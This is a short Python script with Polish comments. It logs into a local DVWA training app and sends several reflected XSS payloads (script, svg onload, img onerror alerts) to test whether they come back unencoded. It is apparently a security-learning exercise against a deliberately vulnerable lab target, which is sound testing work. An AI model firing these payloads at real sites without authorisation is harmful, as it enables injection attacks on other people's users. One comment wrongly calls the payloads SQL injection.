

import requests
from bs4 import BeautifulSoup

session = requests.Session() #tworzymy sesje http


#zdobycie tokena
login_page = session.get('http://localhost/login.php') #pobieramy strone logowania
soup = BeautifulSoup(login_page.text, 'html.parser') #analizujemy ja
token = soup.find('input', {'name': 'user_token'})['value'] #wyszukujemy tam user_token i zapisujemy jego wartosc


#deklaracja danych logowania do DVWA i tokenu
login_data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login', #nazwa przycisku do logowania
    'user_token': token
}

session.post('http://localhost/login.php', data=login_data) #wysylamy dane logowania na strone

# Lista prostych payloadów SQL Injection


url='http://localhost/vulnerabilities/xss_r/'
payloads = [
            '<script>alert("XSS");</script>', #poup
            "><body onload=alert('XSS')>",
            "<F12>><svg/onload=alert('XSS')>",
            '<b><H1>OŁ JEA</H1><b>',#edycja testu,
            "><img src=x onerror=alert('XSS')>" #zdjecie
            ]

for payload in payloads:
    params = {'name': payload, 'Submit': 'Submit'} #parametry, ktore wysylamy
    response = session.get(url, params=params) #wyslanie
    if payload in response.text:
        if '&lt;' not in response.text and '&gt;' not in response.text: #sprawdzenie, czy < > sa jako plain text
            print(f"Podatnosc {payload} prawdopodobnie dziala")
        else:
            print(f"Payload {payload} zostal zakodowany – podatnosc nie dziala")


